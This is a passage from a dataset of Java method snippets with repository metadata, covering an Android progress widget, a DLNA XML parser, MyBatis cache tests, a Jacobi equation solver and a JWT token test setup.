this.mCircleRadius = savedState.circleRadius;\n        this.mLinearProgress = savedState.linearProgress;\n        this.mFillRadius = savedState.fillRadius;\n\n        this.mLastTimeAnimated = SystemClock.uptimeMillis();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30898, "method_name": "getProgress", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getProgress() {\n        return isSpinning ? -1 : mProgress / 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30899, "method_name": "setProgress", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProgress(float progress) {\n        if (isSpinning) {\n            mProgress = 0.0f;\n            isSpinning = false;\n\n            runCallback();\n        }\n\n        if (progress > 1.0f) {\n            progress -= 1.0f;\n        } else if (progress < 0) {\n            progress = 0;\n        }\n\n        if (progress == mTargetProgress) {\n            return;\n        }\n\n        // If we are currently in the right position\n        // we set again the last time animated so the\n        // animation starts smooth from here\n        if (mProgress == mTargetProgress) {\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n        }\n\n        mTargetProgress = Math.min(progress * 360.0f, 360.0f);\n\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30900, "method_name": "setLinearProgress", "class_name": "ProgressView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLinearProgress(boolean isLinear) {\n        mLinearProgress = isLinear;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30901, "method_name": "getCircleRadius", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCircleRadius() {\n        return mCircleRadius;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30902, "method_name": "setCircleRadius", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCircleRadius(int circleRadius) {\n        this.mCircleRadius = circleRadius;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30903, "method_name": "getBarWidth", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBarWidth() {\n        return mBarWidth;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30904, "method_name": "setBarWidth", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBarWidth(int barWidth) {\n        this.mBarWidth = barWidth;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30905, "method_name": "getBarColor", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBarColor() {\n        return mBarColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30906, "method_name": "setBarColor", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBarColor(int barColor) {\n        this.mBarColor = barColor;\n        setupPaints();\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30907, "method_name": "getRimColor", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRimColor() {\n        return mRimColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30908, "method_name": "setRimColor", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRimColor(int rimColor) {\n        this.mRimColor = rimColor;\n        setupPaints();\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30909, "method_name": "getSpinSpeed", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getSpinSpeed() {\n        return mSpinSpeed / 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30910, "method_name": "setSpinSpeed", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpinSpeed(float spinSpeed) {\n        this.mSpinSpeed = spinSpeed * 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30911, "method_name": "getRimWidth", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRimWidth() {\n        return mRimWidth;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30912, "method_name": "setRimWidth", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRimWidth(int rimWidth) {\n        this.mRimWidth = rimWidth;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30913, "method_name": "writeToParcel", "class_name": "WheelSavedState", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void writeToParcel(Parcel out, int flags) {\n            super.writeToParcel(out, flags);\n            out.writeFloat(this.mProgress);\n            out.writeFloat(this.mTargetProgress);\n            out.writeByte((byte) (isSpinning ? 1 : 0));\n            out.writeFloat(this.spinSpeed);\n            out.writeInt(this.barWidth);\n            out.writeInt(this.barColor);\n            out.writeInt(this.rimWidth);\n            out.writeInt(this.rimColor);\n            out.writeInt(this.circleRadius);\n            out.writeByte((byte) (linearProgress ? 1 : 0));\n            out.writeByte((byte) (fillRadius ? 1 : 0));\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "BaseSavedState", "implements": null, "modifiers": ["static"]}}, {"id": 30914, "method_name": "health", "class_name": "ExampleHealthIndicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Health", "snippet": "\tpublic Health health() {\n\t\treturn Health.up().withDetail(\"counter\", 42).build();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/main/java/smoketest/actuator/ExampleHealthIndicator.java", "stars": "47572", "class_props": {"extends": null, "implements": ["HealthIndicator"], "modifiers": ["public"]}}, {"id": 30915, "method_name": "describeContents", "class_name": "APIVpnProfile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int describeContents() {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/ht/vpn/android/api/APIVpnProfile.java", "stars": "4", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30916, "method_name": "writeToParcel", "class_name": "APIVpnProfile", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeToParcel(Parcel dest, int flags) {\n        dest.writeString(mUUID);\n        dest.writeString(mName);\n        if (mUserEditable)\n            dest.writeInt(0);\n        else\n            dest.writeInt(1);\n        //dest.writeString(mProfileCreator);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/ht/vpn/android/api/APIVpnProfile.java", "stars": "4", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30917, "method_name": "getCurrentMediaProviderType", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentMediaProviderType() {\n        return currentProviderType;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30918, "method_name": "getCurrentMediaProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaProvider", "snippet": "    public MediaProvider getCurrentMediaProvider() {\n        return getMediaProvider(getCurrentMediaProviderType());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30919, "method_name": "setCurrentProviderType", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentProviderType(@ProviderType int providerType) {\n        if (getMediaProvider(providerType) != null) {\n            if (this.currentProviderType != providerType) {\n                this.currentProviderType = providerType;\n                if (listeners.size() > 0) {\n                    for (OnProviderChangeListener listener : listeners) {\n                        listener.onProviderChanged(providerType);\n                    }\n                }\n            }\n        } else {\n            throw new IllegalStateException(\"Provider for type no provided\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30920, "method_name": "getMediaProvider", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "MediaProvider", "snippet": "    public MediaProvider getMediaProvider(@ProviderType int providerType) {\n        switch (providerType){\n            case PROVIDER_TYPE_ANIME:\n                return animeProvider;\n            case PROVIDER_TYPE_MOVIE:\n                return movieProvider;\n            case PROVIDER_TYPE_SHOW:\n                return showProvider;\n            default:\n                return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30921, "method_name": "hasProvider", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasProvider(@ProviderType int providerType) {\n        return getMediaProvider(providerType) != null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30922, "method_name": "addProviderListener", "class_name": "ProviderManager", "params": ["OnProviderChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addProviderListener(@NonNull OnProviderChangeListener listener) {\n        //noinspection ConstantConditions\n        if (listener != null && !listeners.contains(listener)) {\n            listeners.add(listener);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30923, "method_name": "removeProviderListener", "class_name": "ProviderManager", "params": ["OnProviderChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeProviderListener(@NonNull OnProviderChangeListener listener) {\n        if (listener != null && listeners.size() > 0) {\n            listeners.remove(listener);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30924, "method_name": "getCurrentSubsProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SubsProvider", "snippet": "    public SubsProvider getCurrentSubsProvider() {\n        return getCurrentMediaProvider().getSubsProvider();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30925, "method_name": "hasCurrentSubsProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCurrentSubsProvider() {\n        return getCurrentMediaProvider().hasSubsProvider();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30926, "method_name": "parse", "class_name": "DLNAEventParser", "params": ["InputStream"], "throws": ["XmlPullParserException", "IOException", "JSONException"], "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject parse(InputStream in) throws XmlPullParserException, IOException, JSONException {\n        try {\n            XmlPullParser parser = Xml.newPullParser();\n            parser.setFeature(XmlPullParser.FEATURE_PROCESS_NAMESPACES, false);\n            parser.setInput(in, null);\n            parser.nextTag();\n            return readEvent(parser);\n        } finally {\n            in.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30927, "method_name": "readEvent", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONObject", "snippet": "    private JSONObject readEvent(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONObject event = new JSONObject();\n\n        JSONArray instanceIDs = new JSONArray();\n        JSONArray queueIDs = new JSONArray();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"Event\");\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            if (name.equals(\"InstanceID\")) {\n                instanceIDs.put(readInstanceID(parser));\n            }\n            else if (name.equals(\"QueueID\")) {\n                queueIDs.put(readQueueID(parser));\n            }\n            else {\n                skip(parser);\n            }\n        }\n\n        if (instanceIDs.length() > 0)\n            event.put(\"InstanceID\", instanceIDs);\n        if (queueIDs.length() > 0)\n            event.put(\"QueueID\", queueIDs);\n\n        return event;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30928, "method_name": "readInstanceID", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONArray", "snippet": "    private JSONArray readInstanceID(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONArray instanceIDs = new JSONArray();\n        JSONObject data = new JSONObject();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"InstanceID\");\n        data.put(\"value\", parser.getAttributeValue(null, \"val\"));\n        instanceIDs.put(data);\n\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            instanceIDs.put(readEntry(name, parser));\n        }\n\n        return instanceIDs;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30929, "method_name": "readQueueID", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONArray", "snippet": "    private JSONArray readQueueID(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONArray queueIDs = new JSONArray();\n        JSONObject data = new JSONObject();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"QueueID\");\n        data.put(\"value\", parser.getAttributeValue(null, \"val\"));\n        queueIDs.put(data);\n\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            queueIDs.put(readEntry(name, parser));\n        }\n\n        return queueIDs;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30930, "method_name": "readEntry", "class_name": "DLNAEventParser", "params": ["String", "XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONObject", "snippet": "    private JSONObject readEntry(String target, XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        parser.require(XmlPullParser.START_TAG, ns, target);\n        String value = parser.getAttributeValue(null, \"val\");\n        String channel = parser.getAttributeValue(null, \"channel\");\n        parser.nextTag();\n        parser.require(XmlPullParser.END_TAG, ns, target);\n\n        JSONObject data = new JSONObject();\n        data.put(target, value);\n\n        if (channel!=null)\n            data.put(\"channel\", channel);\n\n        return data;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30931, "method_name": "skip", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["XmlPullParserException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void skip(XmlPullParser parser) throws XmlPullParserException, IOException {\n        if (parser.getEventType() != XmlPullParser.START_TAG) {\n            throw new IllegalStateException();\n        }\n        int depth = 1;\n        while (depth != 0) {\n            switch (parser.next()) {\n            case XmlPullParser.END_TAG:\n                depth--;\n                break;\n            case XmlPullParser.START_TAG:\n                depth++;\n                break;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30932, "method_name": "shouldDemonstrateHowAllObjectsAreKept", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateHowAllObjectsAreKept() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    for (int i = 0; i < 100000; i++) {\n      cache.putObject(i, i);\n      assertEquals(i, cache.getObject(i));\n    }\n    assertEquals(100000, cache.getSize());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30933, "method_name": "shouldDemonstrateCopiesAreEqual", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateCopiesAreEqual() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SerializedCache(cache);\n    for (int i = 0; i < 1000; i++) {\n      cache.putObject(i, i);\n      assertEquals(i, cache.getObject(i));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30934, "method_name": "shouldRemoveItemOnDemand", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldRemoveItemOnDemand() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    cache.putObject(0, 0);\n    assertNotNull(cache.getObject(0));\n    cache.removeObject(0);\n    assertNull(cache.getObject(0));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30935, "method_name": "shouldFlushAllItemsOnDemand", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFlushAllItemsOnDemand() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    for (int i = 0; i < 5; i++) {\n      cache.putObject(i, i);\n    }\n    assertNotNull(cache.getObject(0));\n    assertNotNull(cache.getObject(4));\n    cache.clear();\n    assertNull(cache.getObject(0));\n    assertNull(cache.getObject(4));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30936, "method_name": "getApi", "class_name": "PasswordApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getApi() {\n        return \"user/password\";\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 30937, "method_name": "setPhone", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setPhone(String phone) {\n        this.phone = phone;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 30938, "method_name": "setCode", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setCode(String code) {\n        this.code = code;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 30939, "method_name": "setPassword", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setPassword(String password) {\n        this.password = password;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 30940, "method_name": "transformToDominant", "class_name": "Jacobi", "params": ["int", "boolean", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean transformToDominant(int r, boolean[] visited, int[] rows) {\n        int matrixLength = matrix.length;\n\n        if (r == matrix.length) {\n            double[][] newMatrix = new double[matrixLength][matrixLength + 1];\n            for (int i = 0; i < rows.length; i++) {\n                if (matrixLength + 1 >= 0)\n                    System.arraycopy(matrix[rows[i]], 0, newMatrix[i], 0, matrixLength + 1);\n            }\n\n            matrix = newMatrix;\n            return true;\n        }\n\n        for (int y = 0; y < matrixLength; y++) {\n            if (visited[y])\n                continue;\n\n            double sum = 0;\n\n            for (int x = 0; x < matrixLength - 1; x++)\n                if (x != r)\n                    sum += Math.abs(matrix[y][x]);\n\n            if (Math.abs(matrix[y][r]) > sum) { // diagonally dominant?\n                visited[y] = true;\n                rows[r] = y;\n\n                if (transformToDominant(r + 1, visited, rows))\n                    return true;\n\n                visited[y] = false;\n            }\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 30941, "method_name": "makeDominant", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean makeDominant() {\n        boolean[] visited = new boolean[matrix.length];\n        int[] rows = new int[matrix.length];\n\n        Arrays.fill(visited, false);\n\n        return transformToDominant(0, visited, rows);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 30942, "method_name": "solve", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Answer", "snippet": "    public Answer solve() {\n        int iterations = 0;\n        int n = matrix.length;\n\n        double[] X = new double[n];\n        double[] P = new double[n];\n\n        Arrays.fill(X, 0);\n        Arrays.fill(P, 0);\n\n        final Answer answer;\n        final List<Answer.Iteration> iterationNodes = new ArrayList<>();\n\n        while (true) {\n            for (int i = 0; i < n; i++) {\n                double sum = matrix[i][n];\n\n                for (int j = 0; j < n; j++)\n                    if (j != i)\n                        sum -= matrix[i][j] * P[j];\n\n                X[i] = 1 / matrix[i][i] * sum;\n            }\n\n            var iterationValues = new double[n];\n            System.arraycopy(X, 0, iterationValues, 0, n);\n            iterationNodes.add(new Answer.Iteration(iterations, iterationValues));\n\n            iterations++;\n            if (iterations == 1)\n                continue;\n\n            boolean stop = true;\n            for (int i = 0; i < n; i++)\n                if (Math.abs(X[i] - P[i]) > epsilon) {\n                    stop = false;\n                    break;\n                }\n\n            if (stop || (iterations == maxIterations)) {\n                answer = new Answer(iterationNodes, !stop);\n                break;\n            }\n\n            P = X.clone();\n        }\n\n        return answer;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 30943, "method_name": "getMatrix", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double[][] getMatrix() {\n        return matrix;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 30944, "method_name": "getName", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return \"\u041c\u0435\u0442\u043e\u0434 \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0456\u0442\u0435\u0440\u0430\u0446\u0456\u0439\";\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 30945, "method_name": "setup", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        tokenProvider = new TokenProvider(new JHipsterProperties());\n        key = Keys.hmacShaKeyFor(Decoders.BASE64\n            .decode(\"fd54a45s65fds737b9aafcb3412e07ed99b267f33413274720ddbb7f6c5e64e9f14075f2d7ed041592f0b7657baf8\"));\n\n        ReflectionTestUtils.setField(tokenProvider, \"key\", key);\n        ReflectionTestUtils.setField(tokenProvider, \"tokenValidityInMilliseconds\", ONE_MINUTE);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 